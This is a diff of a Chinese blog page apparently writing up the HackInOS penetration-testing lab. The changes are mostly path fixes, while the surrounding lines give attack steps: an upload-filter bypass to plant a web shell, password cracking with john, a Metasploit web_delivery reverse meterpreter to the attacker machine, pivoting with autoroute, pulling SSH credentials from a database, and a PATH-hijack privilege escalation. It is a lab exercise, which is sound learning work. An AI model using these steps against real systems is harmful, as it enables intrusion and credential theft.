@@ -13,24 +13,24 @@
 <meta property="og:site_name" content="An0th3r&#39;s Note">
 <meta property="og:description" content="环境设置靶机：192.168.1.24攻击机：192.168.1.14 测试开始 先使用nmap对端口进行扫描 nmap -T4 -A -Pn -n 192.168.1.24   在8000端口开启web服务，使用dirsearch进行目录扫描 dirsearch -u http:&#x2F;&#x2F;192.168.1.24:8000 -e php   进入http:&#x2F;&#x2F;192.168.1.24:8000&#x2F;upl">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/nmap_scan.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/dirsearch_scan.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/github_url.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/upload_source.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/john_result.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/fake_flag.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/python_meterpreter.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/autoroute.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/login_passwd.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/a_out.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/binwalk.png">
-<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/ghidra.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/nmap_scan.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/dirsearch_scan.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/github_url.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/upload_source.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/john_result.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/fake_flag.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/python_meterpreter.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/autoroute.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/login_passwd.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/a_out.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/binwalk.png">
+<meta property="og:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/ghidra.png">
 <meta property="article:published_time" content="2020-08-11T11:50:23.000Z">
-<meta property="article:modified_time" content="2020-08-11T11:54:32.097Z">
+<meta property="article:modified_time" content="2020-08-11T12:05:49.115Z">
 <meta property="article:author" content="An0th3r">
-<meta property="article:tag" content="Target Shoting">
+<meta property="article:tag" content="Target Shooting">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/HackInOS-Writeup.assets/nmap_scan.png">
+<meta name="twitter:image" content="https://an0th3r.github.io/2020/08/11/HackInOS-Writeup/nmap_scan.png">
     
     
         
@@ -143,18 +143,23 @@
       
         <time datetime="2020-08-11T11:50:23.000Z" itemprop="datePublished">2020-08-11</time>
         
-        (Updated: <time datetime="2020-08-11T11:54:32.097Z" itemprop="dateModified">2020-08-11</time>)
+        (Updated: <time datetime="2020-08-11T12:05:49.115Z" itemprop="dateModified">2020-08-11</time>)
         
       
     </div>
 
 
       
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/pentest/">pentest</a>
+    </div>
+
 
       
     <div class="article-tag">
         <i class="fas fa-tag"></i>
-        <a class="tag-link" href="/tags/Target-Shoting/" rel="tag">Target Shoting</a>
+        <a class="tag-link" href="/tags/Target-Shooting/" rel="tag">Target Shooting</a>
     </div>
 
 
@@ -165,13 +170,13 @@
   <div class="content" itemprop="articleBody">
     <h2 id="环境设置"><a href="#环境设置" class="headerlink" title="环境设置"></a>环境设置</h2><p>靶机：192.168.1.24<br>攻击机：192.168.1.14</p>
 <h2 id="测试开始"><a href="#测试开始" class="headerlink" title="测试开始"></a>测试开始</h2><ol>
-<li><p>先使用nmap对端口进行扫描<br> <code>nmap -T4 -A -Pn -n 192.168.1.24</code><br> <img src="HackInOS-Writeup.assets/nmap_scan.png" alt="nmap_scan"></p>
+<li><p>先使用nmap对端口进行扫描<br> <code>nmap -T4 -A -Pn -n 192.168.1.24</code><br> <img src="/2020/08/11/HackInOS-Writeup/nmap_scan.png" alt="nmap_scan"></p>
 </li>
-<li><p>在8000端口开启web服务，使用dirsearch进行目录扫描<br> <code>dirsearch -u http://192.168.1.24:8000 -e php</code><br> <img src="HackInOS-Writeup.assets/dirsearch_scan.png" alt="dirsearch_scan"></p>
+<li><p>在8000端口开启web服务，使用dirsearch进行目录扫描<br> <code>dirsearch -u http://192.168.1.24:8000 -e php</code><br> <img src="/2020/08/11/HackInOS-Writeup/dirsearch_scan.png" alt="dirsearch_scan"></p>
 </li>
 <li><p>进入<a href="http://192.168.1.24:8000/upload.php是一个文件上传的页面，尝试上传木马。" target="_blank" rel="noopener">http://192.168.1.24:8000/upload.php是一个文件上传的页面，尝试上传木马。</a></p>
 </li>
-<li><p>在页面的源码中有一个注释，注释中有github链接<br> <img src="HackInOS-Writeup.assets/github_url.png" alt="github_url"><br> 是该upload.php的源码<br> <img src="HackInOS-Writeup.assets/upload_source.png" alt="upload_source"></p>
+<li><p>在页面的源码中有一个注释，注释中有github链接<br> <img src="/2020/08/11/HackInOS-Writeup/github_url.png" alt="github_url"><br> 是该upload.php的源码<br> <img src="/2020/08/11/HackInOS-Writeup/upload_source.png" alt="upload_source"></p>
 </li>
 <li><p>在上传中通过给木马文件添加<strong>GIF89</strong>和将gif后缀改为php，绕过上传限制，成功上传一句话木马</p>
 </li>
@@ -197,40 +202,40 @@
 </li>
 <li><p>使用john对密码进行解码</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">john shadow.txt</span><br><span class="line">john shadow.txt --show</span><br></pre></td></tr></table></figure>
-<p> <img src="HackInOS-Writeup.assets/john_result.png" alt="john_result"></p>
+<p> <img src="/2020/08/11/HackInOS-Writeup/john_result.png" alt="john_result"></p>
 </li>
 <li><p>通过python派生出一个bash（当前使用的是/bin/sh）</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>通过新的shell切换登陆身份，进入root用户根目录下，发现flag文件</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br></pre></td></tr></table></figure>
-<p> <img src="HackInOS-Writeup.assets/fake_flag.png" alt="fake_flag"></p>
+<p> <img src="/2020/08/11/HackInOS-Writeup/fake_flag.png" alt="fake_flag"></p>
 </li>
 <li><p>之前收集到一个数据库的地址和账号密码，尝试登陆数据库。先打通攻击机与172.18.0.3的连接通道。</p>
 </li>
 <li><p>php的session有局限型，重新创建一个root权限python的session。</p>
  <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload python/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.1.14</span><br><span class="line">set lport 80</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p> <img src="HackInOS-Writeup.assets/python_meterpreter.png" alt="python_meterpreter"></p>
+<p> <img src="/2020/08/11/HackInOS-Writeup/python_meterpreter.png" alt="python_meterpreter"></p>
 </li>
 <li><p>在已有的php的session中输入命令<code>shell -t /bin/bash</code>，启动一个bash，在bash中用<code>su</code>提升至root权限。并在bash中执行上图的python代码，msf接收到一个新的session</p>
 </li>
 <li><p>通过post/multi/manage/autoroute模块自动添加路由信息</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;manage&#x2F;autoroute</span><br><span class="line">set session	6</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p> <img src="HackInOS-Writeup.assets/autoroute.png" alt="autoroute"></p>
+<p> <img src="/2020/08/11/HackInOS-Writeup/autoroute.png" alt="autoroute"></p>
 </li>
 <li><p>在root权限的bash中执行mysql远程登陆命令</p>
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 172.18.0.3 -u wordpress -p</span><br><span class="line">wordpress</span><br><span class="line">use wordpress;</span><br><span class="line">select * from host_ssh_cred;</span><br></pre></td></tr></table></figure>
-<p> <img src="HackInOS-Writeup.assets/login_passwd.png" alt="login_passwd"></p>
+<p> <img src="/2020/08/11/HackInOS-Writeup/login_passwd.png" alt="login_passwd"></p>
 </li>
 <li><p>将pw内容进行解密，得到密码123456，尝试通过ssh远程登陆靶机的ssh</p>
 </li>
-<li><p>登陆后发现Desktop目录下有一个a.out可执行文件<br> <img src="HackInOS-Writeup.assets/a_out.png" alt="a_out"></p>
+<li><p>登陆后发现Desktop目录下有一个a.out可执行文件<br> <img src="/2020/08/11/HackInOS-Writeup/a_out.png" alt="a_out"></p>
 </li>
 <li><p>通过scp将a.out下载到本地进行分析，首先使用binwalk进行检查，发现是一个elf可执行文件</p>
-<p><img src="HackInOS-Writeup.assets/binwalk.png" alt="image-20200811094656443"></p>
+<p><img src="/2020/08/11/HackInOS-Writeup/binwalk.png" alt="image-20200811094656443"></p>
 </li>
 <li><p>将a.out文件放进ghidra中进行反编译分析，查看main函数，通过看反编译代码，发现a.out首先通过<code>setgid(0)</code>与<code>setuid(0)</code>将当前进程设置为root权限，然后执行系统命令<code>whoami</code></p>
-<p> <img src="HackInOS-Writeup.assets/ghidra.png" alt="image-20200811095557860"></p>
+<p> <img src="/2020/08/11/HackInOS-Writeup/ghidra.png" alt="image-20200811095557860"></p>
 </li>
 <li><p>劫持whoami的执行路径，在/tmp路径下生成一个whoami文件，其内容为/bin/bash</p>
   <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo "/bin/bash" &gt; /tmp/whoami</span><br><span class="line">chmod 777 /tmp/whoami</span><br></pre></td></tr></table></figure>
